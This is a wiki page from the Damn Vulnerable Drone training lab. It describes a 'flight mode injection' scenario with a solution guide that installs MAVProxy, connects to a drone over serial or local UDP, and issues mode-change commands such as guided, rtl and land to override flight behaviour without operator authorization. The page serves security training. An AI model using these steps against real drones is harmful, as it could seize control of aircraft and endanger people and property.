<i>Changing the flight mode of the drone through a command injection.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Flight Mode Injection

# Description

Changing the flight mode of a drone using MAVProxy involves sending commands to switch between modes such as Stabilize, Guided, Auto, Loiter, and others. This process is known as flight mode injection — where an attacker injects a mode change command into the MAVLink communication stream to override the current flight behavior without operator authorization.

# Resources

- <a href="https://github.com/ArduPilot/MAVProxy">MAVProxy</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install MAVProxy</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get install python3-dev python3-opencv python3-wxgtk4.0 \
python3-pip python3-matplotlib python3-lxml python3-pygame

pip3 install PyYAML mavproxy --user
echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc
</code></pre>

---

<h3>Step 2. Connect to the Drone</h3>

Serial example:
<pre><code class="code mb-3 mt-3">mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft
</code></pre>

UDP example:
<pre><code class="code mb-3 mt-3">mavproxy.py --master=udp:127.0.0.1:14550
</code></pre>

---

<h3>Step 3. List Available Flight Modes</h3>

<pre><code class="code mb-3 mt-3">mode
</code></pre>

This command will return all available flight modes supported by the vehicle.

---

<h3>Step 4. Inject a Flight Mode Change</h3>

Use the `mode` command followed by the desired mode name:

<pre><code class="code mb-3 mt-3"># Stabilize Mode
mode stabilize

# Acro Mode
mode acro

# Altitude Hold Mode
mode alt_hold

# Auto Mission Mode
mode auto

# Guided Mode
mode guided

# Loiter Mode
mode loiter

# Return to Launch
mode rtl

# Land Immediately
mode land
</code></pre>

</details>
